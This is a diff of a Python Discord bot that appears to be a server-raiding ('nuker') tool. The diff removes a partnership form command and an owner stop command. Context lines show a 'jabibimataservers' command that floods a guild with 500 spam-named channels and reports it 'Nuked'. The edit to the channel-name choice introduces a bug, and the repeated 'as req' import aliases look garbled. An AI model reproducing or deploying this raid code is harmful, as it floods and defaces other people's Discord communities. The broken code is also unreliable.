@@ -60,8 +60,7 @@ from discord.ext.commands.converter import ColorConverter as req
 from discord.ext.commands.core import command, has_permissions
 from discord.ext.commands.errors import BotMissingPermissions as req, CommandError, NSFWChannelRequired as req 
 from discord.user import ClientUser as req
-from discord.webhook import Webhook as req 
-from discord.ext.forms import Form, ReactConfirm 
+from discord.webhook import Webhook as req  
 import discum
 import asyncio.tasks as req 
 import asyncio as req 
@@ -360,56 +359,6 @@ async def nsfw(ctx):
             await ctx.send(embed=embed)
             await ctx.send("||🔥Oh Yess Daddy Jabibi🔥||")
             
-#parter con discord 
-#by jabibi
-
-@bot.command()
-async def partner(ctx):
-    form = Formatter(ctx, "SOLICITUD DE PARTNER BY JABIBI_HACKING")
-    form.add_question(
-        "DONDE ESTA EL LINK DEL SERVER?", # The question which it will ask
-        "link de invitacion", # What the form will call the result of this question
-        "invite" # The type the response should be
-    )
-
-    form.add_question(
-        "Cual es la descripcion de tu server?",
-        "descripcion",
-    )
-
-    form.add_question(
-        "ALGO PARA APOYAR TU SERVER?",
-        "APOYO DE SERVER",
-    )
-
-    results = await form.start()
-    embed = discord.Embed(
-        title=f"Partnership Request from {results.invitelink.guild.name}",
-        description=f"**Description:** {results.description}",
-    )
-    embed.set_thumbnail(url=results.invitelink.guild.icon_url)
-    embed.set_author(name=ctx.author, icon_url=ctx.author.avatar_url)
-    partnershipreq = bot.get_channel("")
-    prompt = await ctx.send(embed=embed)
-
-    confirm = ReactConfirm(user=ctx.author,message=prompt, bot=bot)
-    accepted = await confirm.start()
-
-    if accepted:
-        partners = bot.get_channel("867519875291545600")
-        em = discord.Embed(title=results.invitelink.guild.name,description=results.advertisement, color=0x2F3136)
-        em.set_author(name=ctx.author, icon_url=ctx.author.avatar_url)
-        em.set_thumbnail(url=results.invitelink.guild.icon_url)
-        em.set_thumbnail(url="https://media.discordapp.net/attachments/848250303731990528/864297150980292648/a_a0a2f23646d4581d133ae7af21d23df0.gif")
-    
-        await ctx.send(embed=em)
-
-
-@bot.command()
-@commands.is_owner()
-async def stop(ctx):
-    await ctx.bot.logout()
-    print (Fore.GREEN + f"{discord.client.user.name} has logged out successfully." + Fore.RESET)
 
 
 SPAM_CHANNEL =  ["ANONYMOUS" , "BABYS HACKERS" , "JABIBI ATTACKU" , "JABIBI WAS HERE?","BABY ON TOP"]  
@@ -467,7 +416,7 @@ async def jabibimataservers(ctx):
         print(f"New Invite: {link}")
     amount = 500
     for i in range(amount):
-       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+       await guild.create_text_channel(random.choice('SPAM_CHANNEL'))
     print(f"Nuked {guild.name} Successfully.")
     return
 
